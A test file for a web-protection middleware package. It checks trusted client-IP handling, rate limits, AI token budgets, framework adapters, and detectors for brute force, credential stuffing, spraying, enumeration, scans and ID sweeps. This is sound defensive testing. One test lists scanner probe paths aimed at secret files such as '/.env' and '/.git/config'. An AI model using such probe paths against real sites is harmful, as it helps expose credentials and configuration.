// Tests of @bitora/guard. Run with: node --test internal/guardpkg/guard.test.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createGuard as realCreateGuard, describe } from './pkg/index.js'
import { bitoraExpress } from './pkg/express.js'
import { bitoraMiddleware } from './pkg/next.js'
import { bitoraHono } from './pkg/hono.js'
import { bitoraStore, memoryStore, redisStore, upstashStore } from './pkg/store.js'

// The package works only with a licence (see license.js). The tests of its behaviour run with one that is always valid; the tests of the
// licence itself are at the end and use the real thing.
const ACTIVE = { usable: () => true, ready: async () => true, status: () => 'active', reason: () => '' }
const createGuard = (o = {}) => realCreateGuard({ __license: ACTIVE, ...o })

const req = (path, { ip = '203.0.113.7', agent = 'Mozilla/5.0 Chrome/120', method = 'GET' } = {}) =>
  new Request('https://shop.example.com' + path, { method, headers: { 'x-forwarded-for': ip, 'user-agent': agent } })

// A fake Bitora: records what it is sent and answers the decisions API with what the test says.
function fakeBitora({ action = 'allow', mode = 'balanced', delay = 0, fail = false, blocked = [] } = {}) {
  const calls = { checks: [], lists: 0, events: [] }
  const fetch = async (url, init = {}) => {
    if (delay) await new Promise((r) => setTimeout(r, delay))
    if (init.signal?.aborted) throw new Error('aborted')
    if (fail) throw new Error('down')
    if (url.includes('/decisions/check')) {
      calls.checks.push(url)
      return { ok: true, json: async () => ({ action, mode, ttl: 60 }) }
    }
    if (url.includes('/decisions/active')) {
      calls.lists++
      return { ok: true, json: async () => ({ mode, ttl: 60, decisions: blocked.map((ip) => ({ ip, action: 'block', expires_at: new Date(Date.now() + 600000).toISOString() })) }) }
    }
    calls.events.push(JSON.parse(init.body).events)
    return { ok: true, json: async () => ({}) }
  }
  return { fetch, calls }
}

// By default these tests sit behind one proxy of their own, which is what a deployment must say to be believed.
const guard = (o = {}) => createGuard({ trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, ...o })

test('the address of the visitor is only taken from a source the visitor cannot write', () => {
  const web = (xff, extra = {}) => new Request('https://x.test/a?b=1', { headers: { 'x-forwarded-for': xff, ...extra } })
  // a header anybody can send is not believed
  assert.deepEqual([describe(web('6.6.6.6')).ip, describe(web('6.6.6.6')).ipSource], ['', 'none'])
  // behind N proxies of yours, the entry N from the right is the one your own proxy wrote
  assert.deepEqual([describe(web('6.6.6.6, 8.8.8.8'), { trustProxy: 1 }).ip, describe(web('6.6.6.6, 8.8.8.8'), { trustProxy: 1 }).ipSource], ['8.8.8.8', 'xff-right'])
  assert.equal(describe(web('6.6.6.6, 8.8.8.8, 10.0.0.1'), { trustProxy: 2 }).ip, '8.8.8.8')
  // a header the owner vouches for
  const cf = describe(web('6.6.6.6', { 'cf-connecting-ip': '1.1.1.1' }), { ipHeader: 'cf-connecting-ip' })
  assert.deepEqual([cf.ip, cf.ipSource], ['1.1.1.1', 'header:cf-connecting-ip'])
  // Node, directly on the internet: the socket, whatever the header says
  const direct = { method: 'GET', url: '/', headers: { 'x-forwarded-for': '6.6.6.6' }, socket: { remoteAddress: '::ffff:8.8.4.4' } }
  assert.deepEqual([describe(direct).ip, describe(direct).ipSource], ['8.8.4.4', 'socket'])
  // Node behind one proxy of yours (its own address is private): what the proxy saw, never what the visitor put first
  const behind = { method: 'GET', url: '/', headers: { 'x-forwarded-for': '6.6.6.6, 8.8.8.8' }, socket: { remoteAddress: '10.0.0.2' } }
  assert.deepEqual([describe(behind).ip, describe(behind).ipSource], ['8.8.8.8', 'xff-right'])
  assert.equal(describe({ headers: {}, url: '/', socket: { remoteAddress: '8.8.8.8' } }).path, '/')
  assert.equal(describe({ method: 'post', originalUrl: '/a/b?x=1', headers: {}, socket: { remoteAddress: '8.8.8.8' } }).path, '/a/b')
})

test('on Vercel the address comes from the header Vercel writes', () => {
  const r = new Request('https://x.test/', { headers: { 'x-vercel-forwarded-for': '8.8.8.8', 'x-forwarded-for': '6.6.6.6' } })
  process.env.VERCEL = '1'
  try {
    const d = describe(r)
    assert.deepEqual([d.ip, d.ipSource], ['8.8.8.8', 'vercel'])
  } finally {
    delete process.env.VERCEL
  }
})

test('rotating x-forwarded-for does not get around a limit', async () => {
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false }, rateLimit: { max: 2, windowSec: 60 } })
  const node = (spoof) => ({ method: 'GET', url: '/', headers: { 'x-forwarded-for': spoof }, socket: { remoteAddress: '8.8.4.4' } })
  assert.equal((await g.check(node('1.1.1.1'))).action, 'allow')
  assert.equal((await g.check(node('2.2.2.2'))).action, 'allow')
  assert.equal((await g.check(node('3.3.3.3'))).status, 429, 'the third request of the same connection is limited, whatever it claims to be')
})

test('without a trustworthy address nothing is limited or reported by address, and nothing is invented', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'bsec_x', mode: 'enforce', fetch: b.fetch, remote: { enabled: false }, rateLimit: { max: 1, windowSec: 60 }, routes: [{ match: '/api/login', max: 1 }], bots: { paths: ['/api/'] } })
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/api/login'))).action, 'allow')
  assert.equal((await g.check(req('/api/x', { agent: 'curl/8' }))).status, 403, 'a robot is still recognised by what it says it is')
  await g.flush()
  assert.deepEqual(b.calls.events, [], 'no address, so no report that could be attributed to anybody')
  // a budget charged to a user does not need an address
  const ai = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false }, aiBudget: [{ match: '/api/ai', max: 1, windowSec: 3600, key: (r) => r.headers.get('x-user') }] })
  const asUser = () => new Request('https://x.test/api/ai', { headers: { 'x-user': 'ana' } })
  assert.equal((await ai.check(asUser())).action, 'allow')
  assert.equal((await ai.check(asUser())).status, 429)
})

test('observe mode never blocks: it says what it would have done', async () => {
  const g = guard({ rateLimit: { max: 2, windowSec: 60 } })
  for (let i = 0; i < 2; i++) assert.equal((await g.check(req('/'))).action, 'allow')
  const third = await g.check(req('/'))
  assert.equal(third.action, 'allow')
  assert.equal(third.wouldHave, 'rate_limited')
})

test('enforce mode answers 429 with Retry-After once the limit of an IP is exceeded, and other IPs are not affected', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 2, windowSec: 60 } })
  await g.check(req('/'))
  await g.check(req('/'))
  const d = await g.check(req('/'))
  assert.equal(d.action, 'block')
  assert.equal(d.status, 429)
  assert.ok(Number(d.headers['retry-after']) >= 1)
  assert.equal((await g.check(req('/', { ip: '203.0.113.99' }))).action, 'allow')
})

test('a window ends: the same IP can ask again later', async () => {
  let t = 1_000_000
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 10 }, now: () => t })
  assert.equal((await g.check(req('/'))).action, 'allow')
  assert.equal((await g.check(req('/'))).action, 'block')
  t += 11_000
  assert.equal((await g.check(req('/'))).action, 'allow')
})

test('a route has its own, stricter limit', async () => {
  const g = guard({ mode: 'enforce', routes: [{ match: '/api/login', max: 3, windowSec: 60 }] })
  for (let i = 0; i < 3; i++) assert.equal((await g.check(req('/api/login'))).action, 'allow')
  assert.equal((await g.check(req('/api/login'))).action, 'block')
  assert.equal((await g.check(req('/api/products'))).action, 'allow')
})

test('the AI budget is per user when the app says who the user is, and per IP otherwise', async () => {
  const g = guard({ mode: 'enforce', aiBudget: [{ match: '/api/ai', max: 2, windowSec: 3600, key: (r) => r.headers.get('x-user') }] })
  const asUser = (u) => new Request('https://shop.example.com/api/ai/chat', { headers: { 'x-forwarded-for': '203.0.113.7', 'x-user': u } })
  assert.equal((await g.check(asUser('ana'))).action, 'allow')
  assert.equal((await g.check(asUser('ana'))).action, 'allow')
  const over = await g.check(asUser('ana'))
  assert.equal(over.status, 429)
  assert.equal(over.reason, 'ai_budget')
  assert.equal((await g.check(asUser('luis'))).action, 'allow') // same IP, another user, another budget
})

test('automation is stopped only on the protected paths', async () => {
  const g = guard({ mode: 'enforce', bots: { paths: ['/api/'] } })
  assert.equal((await g.check(req('/api/data', { agent: 'curl/8.4.0' }))).status, 403)
  assert.equal((await g.check(req('/api/data', { agent: 'python-requests/2.31' }))).action, 'block')
  assert.equal((await g.check(req('/about', { agent: 'curl/8.4.0' }))).action, 'allow')
  assert.equal((await g.check(req('/api/data'))).action, 'allow')
})

test('static files and preflight requests are never counted', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/_next/static/a.js'))).action, 'allow')
  for (let i = 0; i < 5; i++) assert.equal((await g.check(req('/api', { method: 'OPTIONS' }))).action, 'allow')
})

test('what it sees is reported in one batch, aggregated, with where the address came from, and never for a private address', async () => {
  const b = fakeBitora()
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: b.fetch, remote: { enabled: false }, rateLimit: { max: 1, windowSec: 60 }, bots: { paths: ['/api/'] } })
  await g.check(req('/'))
  for (let i = 0; i < 4; i++) await g.check(req('/'))
  await g.check(req('/api/x', { ip: '203.0.113.50', agent: 'curl/8' }))
  await g.check(req('/', { ip: '10.1.2.3' }))
  await g.check(req('/', { ip: '10.1.2.3' }))
  await g.flush()
  assert.equal(b.calls.events.length, 1)
  const ev = b.calls.events[0]
  const limited = ev.find((e) => e.kind === 'rate_limited' && e.ip === '203.0.113.7')
  assert.equal(limited.count, 4)
  assert.equal(limited.window_s, 60)
  assert.equal(limited.ip_source, 'xff-right')
  assert.equal(ev.find((e) => e.kind === 'bot_blocked').agent, 'curl')
  assert.ok(!ev.some((e) => e.ip === '10.1.2.3'), 'private addresses are not reported')
  await g.flush()
  assert.equal(b.calls.events.length, 1, 'nothing left to send')
})

test('without a secret nothing is ever sent', async () => {
  const b = fakeBitora()
  const g = createGuard({ trustProxy: 1, fetch: b.fetch, rateLimit: { max: 1, windowSec: 60 } })
  for (let i = 0; i < 3; i++) await g.check(req('/'))
  await g.flush()
  assert.equal(b.calls.events.length + b.calls.checks.length + b.calls.lists, 0)
})

test('the list of blocked addresses is downloaded once, however many visitors come, and checked in memory', async () => {
  const b = fakeBitora({ blocked: ['198.51.100.9'], mode: 'balanced' })
  let t = 1_000_000
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: b.fetch, report: { enabled: false }, now: () => t, remote: { blocking: true } })
  const d = await g.check(req('/', { ip: '198.51.100.9' }))
  assert.equal(d.status, 403)
  assert.equal(d.reason, 'reputation')
  for (let i = 0; i < 50; i++) assert.equal((await g.check(req('/', { ip: '198.51.100.' + (10 + i) }))).action, 'allow')
  assert.equal(b.calls.lists, 1, 'one download for 51 different visitors')
  assert.equal(b.calls.checks.length, 0, 'no question about each address')
  t += 31_000
  await g.check(req('/'))
  await new Promise((r) => setTimeout(r, 10))
  assert.equal(b.calls.lists, 2, 'refreshed after the interval')
})

test('a block is enforced only if the site is not in observe mode, and the first request is not held up', async () => {
  const slow = fakeBitora({ blocked: ['198.51.100.9'], mode: 'strict', delay: 30 })
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: slow.fetch, report: { enabled: false } })
  const t0 = Date.now()
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).action, 'allow')
  assert.ok(Date.now() - t0 < 20, 'it did not wait for Bitora')
  await new Promise((r) => setTimeout(r, 80))
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403, 'the list is ready from the next request')

  const observing = fakeBitora({ blocked: ['198.51.100.9'], mode: 'observe' })
  const g2 = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: observing.fetch, report: { enabled: false }, remote: { blocking: true } })
  assert.equal((await g2.check(req('/', { ip: '198.51.100.9' }))).action, 'allow')
})

test('fail-open: if Bitora is down, requests go through and a list already held keeps working until it expires', async () => {
  const b = fakeBitora({ blocked: ['198.51.100.9'], mode: 'strict' })
  let down = false
  let t = 1_000_000
  const flaky = (url, init) => (down ? Promise.reject(new Error('down')) : b.fetch(url, init))
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: flaky, report: { enabled: false }, now: () => t, remote: { blocking: true } })
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403)
  down = true
  t += 40_000
  assert.equal((await g.check(req('/', { ip: '198.51.100.9' }))).status, 403, 'the list it already had still applies')
  assert.equal((await g.check(req('/', { ip: '198.51.100.77' }))).action, 'allow', 'and nothing new is blocked')
  const never = createGuard({ secret: 'bsec_x', trustProxy: 1, mode: 'enforce', fetch: () => Promise.reject(new Error('down')), report: { enabled: false } })
  assert.equal((await never.check(req('/'))).action, 'allow')
  assert.equal((await guard({ mode: 'enforce' }).check(null)).action, 'allow', 'a broken request object never throws')
})

test('asking about each address (mode ip) caches no longer than cacheMs, even if the server says more', async () => {
  const b = fakeBitora({ action: 'allow', mode: 'balanced' })
  let t = 1_000_000
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, fetch: b.fetch, report: { enabled: false }, now: () => t, remote: { mode: 'ip', blocking: true, cacheMs: 2000 } })
  await g.check(req('/'))
  await g.check(req('/'))
  assert.equal(b.calls.checks.length, 1, 'cached')
  t += 2500
  await g.check(req('/'))
  assert.equal(b.calls.checks.length, 2, 'the server said 60 s, cacheMs says 2 s')
})

test('the Express adapter ends the response with the status and lets the rest through', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const mw = bitoraExpress(g)
  const run = () =>
    new Promise((resolve) => {
      const res = { headers: {}, setHeader(k, v) { this.headers[k] = v }, end(b) { resolve({ status: this.statusCode, body: b, headers: this.headers }) } }
      mw({ method: 'GET', url: '/', headers: {}, socket: { remoteAddress: '8.8.4.4' } }, res, () => resolve({ passed: true }))
    })
  assert.equal((await run()).passed, true)
  const blocked = await run()
  assert.equal(blocked.status, 429)
  assert.match(blocked.body, /rate_limited/)
  assert.ok(blocked.headers['retry-after'])
})

test('the Next.js adapter returns a response when it blocks and continues otherwise', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const mw = bitoraMiddleware(g)
  const first = await mw(req('/api/x'))
  assert.equal(first.headers.get('x-middleware-next'), '1')
  const second = await mw(req('/api/x'))
  assert.equal(second.status, 429)
  assert.equal((await second.json()).error, 'rate_limited')
})

test('the Hono adapter answers with c.json when it blocks', async () => {
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const mw = bitoraHono(g)
  let nexted = 0
  const c = { req: { raw: req('/') }, json: (b, s, h) => ({ b, s, h }) }
  await mw(c, async () => nexted++)
  assert.equal(nexted, 1)
  const out = await mw(c, async () => nexted++)
  assert.equal(out.s, 429)
  assert.equal(nexted, 1)
})

test('AI spend: charged by an estimate, settled with the real usage, refused when a budget is spent', async () => {
  const seen = []
  const client = {
    chat: { completions: { create: async (p) => { seen.push(p); return { usage: { total_tokens: 100 } } } } },
    models: { list: () => 'untouched' },
  }
  const g = createGuard({ mode: 'enforce', trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, ai: { maxOutputTokens: 500, perUser: { tokens: 1000, windowSec: 3600 }, global: { tokens: 100000, windowSec: 3600 } } })
  const ana = g.ai.wrap(client, { user: () => 'ana' })
  assert.equal(ana.models.list(), 'untouched', 'what is not a create() call is left alone')
  await ana.chat.completions.create({ messages: [{ role: 'user', content: 'hola' }], max_tokens: 4000 })
  assert.equal(seen[0].max_tokens, 500, 'the output a request may ask for is capped')
  let allowed = 1
  let refusal
  for (let i = 0; i < 30 && !refusal; i++) {
    try {
      await ana.chat.completions.create({ messages: [{ role: 'user', content: 'hola' }] })
      allowed++
    } catch (e) {
      refusal = e
    }
  }
  assert.equal(refusal?.status, 429)
  assert.equal(refusal?.reason, 'user_budget')
  assert.ok(allowed >= 4 && allowed <= 6, 'calls are charged what they really used (100), not what was reserved (about 510): ' + allowed)
  const luis = g.ai.wrap(client, { user: () => 'luis' })
  await luis.chat.completions.create({ messages: [{ role: 'user', content: 'hola' }] }) // another user, another budget
})

test('AI spend: the ceiling of the whole site stops everybody, and observe mode only watches', async () => {
  const client = { messages: { create: async () => ({ usage: { input_tokens: 40, output_tokens: 60 } }) } }
  const mk = (mode) => createGuard({ mode, trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, ai: { maxOutputTokens: 100, perUser: { tokens: 1e9, windowSec: 60 }, global: { tokens: 250, windowSec: 60 } } })
  const g = mk('enforce')
  const a = g.ai.wrap(client, { user: 'ana' })
  const b = g.ai.wrap(client, { user: 'luis' })
  await a.messages.create({ messages: 'hi' })
  await b.messages.create({ messages: 'hi' })
  await assert.rejects(() => a.messages.create({ messages: 'hi' }), (e) => e.reason === 'site_budget' && e.status === 429, 'the third call finds the site budget spent, whoever makes it')
  const watching = mk('observe')
  const w = watching.ai.wrap(client, { user: 'ana' })
  for (let i = 0; i < 6; i++) await w.messages.create({ messages: 'hi', max_tokens: 9999 })
})

test('AI spend is reported to Bitora with the address it was charged to', async () => {
  const b = fakeBitora()
  const client = { messages: { create: async () => ({ usage: { total_tokens: 10 } }) } }
  const g = createGuard({ secret: 'bsec_x', fetch: b.fetch, trustProxy: 1, mode: 'enforce', remote: { enabled: false }, ai: { maxOutputTokens: 10, perUser: { tokens: 20, windowSec: 60 }, global: { tokens: 1e9, windowSec: 60 } } })
  const ai = g.ai.wrap(client, { user: 'ana', ip: '8.8.8.8', ipSource: 'socket' })
  await assert.rejects(async () => { for (let i = 0; i < 5; i++) await ai.messages.create({ messages: 'hello there' }) })
  await g.flush()
  const ev = b.calls.events[0]?.find((e) => e.kind === 'ai_budget')
  assert.ok(ev && ev.ip === '8.8.8.8' && ev.ip_source === 'socket', JSON.stringify(b.calls.events))
})

test('sign-up: shape, throw-away domains, and waves from one address or one network', () => {
  let t = 1_000_000
  const g = createGuard({ now: () => t, remote: { enabled: false }, report: { enabled: false }, signup: { perIp: { max: 2, windowSec: 60 }, perNetwork: { max: 4, windowSec: 60 }, extraDisposable: ['mi-lista.test'] } })
  assert.deepEqual(g.signup({ email: 'ana@gmail.com', ip: '8.8.8.8' }), { action: 'allow', reasons: [] })
  assert.deepEqual(g.signup({ email: 'no es un email', ip: '8.8.4.4' }).reasons, ['invalid_email'])
  assert.deepEqual(g.signup({ email: 'x@Mailinator.com', ip: '9.9.9.9' }).reasons, ['disposable_email'])
  assert.deepEqual(g.signup({ email: 'x@mi-lista.test', ip: '9.9.9.10' }).reasons, ['disposable_email'], 'the owner adds their own')
  g.signup({ email: 'a@gmail.com', ip: '1.1.1.1' })
  g.signup({ email: 'b@gmail.com', ip: '1.1.1.1' })
  assert.deepEqual(g.signup({ email: 'c@gmail.com', ip: '1.1.1.1' }).reasons, ['too_many_from_ip'])
  // many different addresses of one /24 network
  const net = (n) => g.signup({ email: 'u' + n + '@gmail.com', ip: '5.5.5.' + n })
  for (let n = 1; n <= 4; n++) assert.equal(net(n).action, 'allow')
  assert.deepEqual(net(5).reasons, ['too_many_from_network'])
  assert.equal(g.signup({ email: 'ok@gmail.com', ip: '6.6.6.6' }).action, 'allow', 'another network is not affected')
  t += 61_000
  assert.equal(net(6).action, 'allow', 'the window ends')
  assert.equal(g.signup({ email: 'ok@gmail.com' }).action, 'allow', 'without an address only the email is judged')
})

test('the Next.js 16 proxy is the same function under its new name', async () => {
  const { bitoraProxy } = await import('./pkg/next.js')
  const g = guard({ mode: 'enforce', rateLimit: { max: 1, windowSec: 60 } })
  const proxy = bitoraProxy(g)
  assert.equal((await proxy(req('/api/x'))).headers.get('x-middleware-next'), '1')
  assert.equal((await proxy(req('/api/x'))).status, 429)
})

test('the Deno adapter uses the connection address when no trusted header names the visitor', async () => {
  const { bitoraDeno } = await import('./pkg/deno.js')
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false }, rateLimit: { max: 1, windowSec: 60 } })
  const handler = bitoraDeno(g, () => new Response('ok'))
  const info = (host) => ({ remoteAddr: { hostname: host } })
  const r = () => new Request('https://x.test/', { headers: { 'x-forwarded-for': '6.6.6.6' } })
  assert.equal((await handler(r(), info('8.8.4.4'))).status, 200)
  const blocked = await handler(r(), info('8.8.4.4'))
  assert.equal(blocked.status, 429)
  assert.equal((await blocked.json()).error, 'rate_limited')
  assert.equal((await handler(r(), info('8.8.8.8'))).status, 200, 'another connection, another counter, whatever x-forwarded-for says')
})

// ---- detections that read the answers (guard 2.0) ----
const web = (path, { ip = '8.8.8.8', method = 'GET', headers = {} } = {}) =>
  new Request('https://shop.example.com' + path, { method, headers: { 'x-forwarded-for': ip, 'user-agent': 'Mozilla/5.0 Chrome/120', ...headers } })
const clock = () => {
  const c = { t: 1_000_000, now: () => c.t, tick: (ms) => (c.t += ms) }
  return c
}
// A guard that reports into `sent` (flush() delivers it).
const watched = (o = {}) => {
  const sent = []
  const guard = createGuard({
    trustProxy: 1,
    remote: { enabled: false },
    login: { paths: ['/api/login'] },
    secret: 'bsec_x',
    report: { enabled: true, maxBatch: 1000 },
    fetch: async (u, i) => (sent.push(...JSON.parse(i.body).events), { ok: true }),
    ...o,
  })
  return { guard, sent }
}
const g2 = (o = {}) => createGuard({ trustProxy: 1, remote: { enabled: false }, report: { enabled: false }, login: { paths: ['/api/login'] }, ...o })
const login = (guard, ip, account, status = 401) => guard.observe(web('/api/login', { ip, method: 'POST' }), { status, account })

test('brute force: many failures against one account trip the rule; a few typos do not', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 4; i++) login(guard, '8.8.8.8', 'ana@x.com') // a person mistyping
  await guard.flush()
  assert.equal(sent.filter((e) => e.kind === 'brute_force').length, 0, 'four typos are not an attack')
  for (let i = 0; i < 8; i++) login(guard, '1.1.1.' + (i + 1), 'ana@x.com') // many addresses, one account
  await guard.flush()
  const ev = sent.find((e) => e.kind === 'brute_force')
  assert.ok(ev && ev.count >= 10 && ev.path === '/api/login' && ev.window_s === 600, JSON.stringify(sent))
  assert.ok(!JSON.stringify(sent).includes('ana@x.com'), 'the account never leaves the server')
})

test('a slow attack that never trips the short window is caught by the daily counter', async () => {
  const c = clock()
  const { guard, sent } = watched({ now: c.now })
  for (let i = 0; i < 30; i++) {
    login(guard, '9.9.9.' + (i % 200), 'boss@x.com')
    c.tick(20 * 60 * 1000) // one attempt every 20 minutes: never ten in ten minutes
  }
  await guard.flush()
  assert.ok(sent.find((e) => e.kind === 'brute_force' && e.window_s === 86400), 'the long counter sees what the short one forgets')
})

test('credential stuffing: one address trying many accounts; one user logging in is fine', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 20; i++) login(guard, '8.8.4.4', 'person' + i + '@x.com', 401)
  login(guard, '8.8.8.8', 'me@x.com', 401)
  login(guard, '8.8.8.8', 'me@x.com', 200)
  await guard.flush()
  const e = sent.find((x) => x.kind === 'credential_stuffing')
  assert.ok(e && e.ip === '8.8.4.4' && e.count >= 8, JSON.stringify(sent))
  assert.ok(!sent.some((x) => x.ip === '8.8.8.8'), 'a person who failed once and then got in is not reported')
})

test('password spraying: many accounts failing once across the site blames no address', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 30; i++) login(guard, '20.0.' + i + '.1', 'user' + i + '@x.com')
  await guard.flush()
  const e = sent.find((x) => x.kind === 'password_spraying')
  assert.ok(e && e.ip === '' && e.count >= 25, JSON.stringify(sent.map((x) => x.kind)))
  const quiet = watched()
  for (let i = 0; i < 10; i++) login(quiet.guard, '20.0.' + i + '.1', 'user' + i + '@x.com')
  await quiet.guard.flush()
  assert.ok(!quiet.sent.some((x) => x.kind === 'password_spraying'), 'ten failures on a busy site are normal')
})

test('user enumeration: an address asking for many accounts that do not exist', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 6; i++) guard.auth.failed({ ip: '8.8.4.4', username: 'nobody' + i, reason: 'unknown_user' })
  guard.auth.failed({ ip: '8.8.8.8', username: 'real', reason: 'bad_password' })
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'user_enumeration' && x.ip === '8.8.4.4'))
  assert.ok(!sent.some((x) => x.ip === '8.8.8.8'))
})

test('scans: a run of different pages that do not exist; a few broken links do not count', async () => {
  const { guard, sent } = watched()
  for (let i = 0; i < 3; i++) guard.observe(web('/old-page-' + i, { ip: '8.8.8.8' }), { status: 404 })
  for (let i = 0; i < 15; i++) guard.observe(web('/admin-' + i, { ip: '8.8.4.4' }), { status: 404 })
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'scan_probe' && x.ip === '8.8.4.4'))
  assert.ok(!sent.some((x) => x.ip === '8.8.8.8'))
})

test('forced browsing: a user denied on many different routes, not on the same one again and again', async () => {
  const a = watched({ user: () => 'u1' })
  for (let i = 0; i < 12; i++) a.guard.observe(web('/api/area' + i), { status: 403 })
  const b = watched({ user: () => 'u2' })
  for (let i = 0; i < 12; i++) b.guard.observe(web('/api/private'), { status: 403 })
  await a.guard.flush()
  await b.guard.flush()
  assert.ok(a.sent.some((x) => x.kind === 'forced_browsing'))
  assert.ok(!b.sent.some((x) => x.kind === 'forced_browsing'))
})

test('id sweep: a user reading dozens of different ids of one route; opening a few records is normal', async () => {
  const { guard, sent } = watched({ user: (r) => r.headers.get('x-user') })
  for (let i = 1; i <= 40; i++) guard.observe(web('/api/invoices/' + (1000 + i), { headers: { 'x-user': 'mallory' } }), { status: 200 })
  for (let i = 1; i <= 6; i++) guard.observe(web('/api/invoices/' + (2000 + i), { headers: { 'x-user': 'alice' } }), { status: 200 })
  await guard.flush()
  const e = sent.find((x) => x.kind === 'id_sweep')
  assert.ok(e && e.path === '/api/invoices/:id' && e.count >= 30, JSON.stringify(sent))
  assert.equal(sent.filter((x) => x.kind === 'id_sweep').length, 1, 'reported once, not once per request')
  assert.ok(!JSON.stringify(sent).includes('1001'), 'the ids never leave the server')
})

test('trap addresses: .env and wp-login are scanners; /api/.env too; normal pages are not', async () => {
  const { guard, sent } = watched({ mode: 'enforce' })
  for (const p of ['/.env', '/wp-login.php', '/.git/config', '/api/.env', '/phpmyadmin/index.php']) {
    assert.equal((await guard.check(web(p, { ip: '5.5.5.5' }))).action, 'block', p)
  }
  for (const p of ['/', '/blog/environment', '/api/login', '/.well-known/security.txt', '/about-wordpress-themes']) assert.equal((await guard.check(web(p, { ip: '8.8.8.8' }))).action, 'allow', p)
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'trap_hit' && x.action === 'blocked'))
  const owner = g2({ mode: 'enforce', traps: { except: ['/wp-login.php'] } })
  assert.equal((await owner.check(web('/wp-login.php'))).action, 'allow', 'a site that really runs WordPress says so')
})

test('observe mode only says what it would have done with a trap', async () => {
  const { guard, sent } = watched()
  assert.equal((await guard.check(web('/.env', { ip: '8.8.4.4' }))).action, 'allow')
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'trap_hit' && x.would_have === true && x.action === 'reported'))
})

test('cross-site writes are reported by default and blocked only when asked; same-site and reads pass', async () => {
  const cross = { 'sec-fetch-site': 'cross-site' }
  assert.equal((await g2({ mode: 'enforce' }).check(web('/api/pay', { method: 'POST', headers: cross }))).action, 'allow', 'report-only by default')
  const strict = g2({ mode: 'enforce', csrf: { block: true, exempt: ['/api/webhooks/'] } })
  assert.equal((await strict.check(web('/api/pay', { method: 'POST', headers: cross }))).action, 'block')
  assert.equal((await strict.check(web('/api/pay', { method: 'POST', headers: { 'sec-fetch-site': 'same-origin' } }))).action, 'allow')
  assert.equal((await strict.check(web('/api/pay', { method: 'GET', headers: cross }))).action, 'allow')
  assert.equal((await strict.check(web('/api/webhooks/stripe', { method: 'POST', headers: cross }))).action, 'allow', 'a webhook is meant to come from outside')
  assert.equal((await strict.check(web('/api/pay', { method: 'POST' }))).action, 'allow', 'no header (curl, old browser): nothing to judge')
})

test('size and shape: a huge URL, a body over the limit, a method the route does not take', async () => {
  const g = g2({ mode: 'enforce', limits: { maxBodyBytes: 1000, methods: [{ match: '/api/login', allow: ['POST'] }] } })
  assert.equal((await g.check(web('/x?q=' + 'a'.repeat(9000), { ip: '8.8.1.1' }))).status, 414)
  assert.equal((await g.check(web('/api/upload', { ip: '8.8.1.2', method: 'POST', headers: { 'content-length': '5000' } }))).status, 413)
  assert.equal((await g.check(web('/api/upload', { ip: '8.8.1.3', method: 'POST', headers: { 'content-length': '500' } }))).action, 'allow')
  assert.equal((await g.check(web('/api/login', { ip: '8.8.1.4', method: 'DELETE' }))).status, 405)
  assert.equal((await g.check(web('/api/login', { ip: '8.8.1.5', method: 'POST' }))).action, 'allow')
})

test('JSON shape: depth and number of keys, with a budget', async () => {
  const { jsonShape } = await import('./pkg/detect.js')
  let deep = {}
  for (let i = 0; i < 50; i++) deep = { a: deep }
  assert.ok(jsonShape(deep).depth >= 50)
  assert.deepEqual(jsonShape({ a: 1, b: { c: 2 } }), { depth: 2, keys: 3 })
})

test('reputation: findings add up, fade with time, and only slow down or block in enforce', async () => {
  const c = clock()
  const g = g2({ mode: 'enforce', now: c.now })
  const ip = '8.8.4.4'
  await g.check(web('/.env', { ip })) // 5 points: S = 0.68
  const d = await g.check(web('/', { ip }))
  assert.equal(d.status, 429, 'between 0.65 and 0.88 the answer is a 429, never a delay')
  assert.ok(d.headers['retry-after'])
  await g.check(web('/wp-login.php', { ip }))
  assert.equal((await g.check(web('/', { ip }))).status, 403, 'from 0.88 it is blocked')
  c.tick(10 * 60 * 1000) // ten minutes: the score has faded
  assert.equal((await g.check(web('/', { ip }))).action, 'allow')
  assert.equal((await g.check(web('/', { ip: '8.8.8.8' }))).action, 'allow', 'other addresses are not affected')
  const watching = g2({ now: c.now })
  await watching.check(web('/.env', { ip }))
  const w = await watching.check(web('/', { ip }))
  assert.equal(w.action, 'allow', 'observe mode never blocks')
  assert.equal(w.wouldHave, 'reputation_local')
})

test('an address that cannot be trusted earns no score', async () => {
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false } }) // no trustProxy: x-forwarded-for is not believed
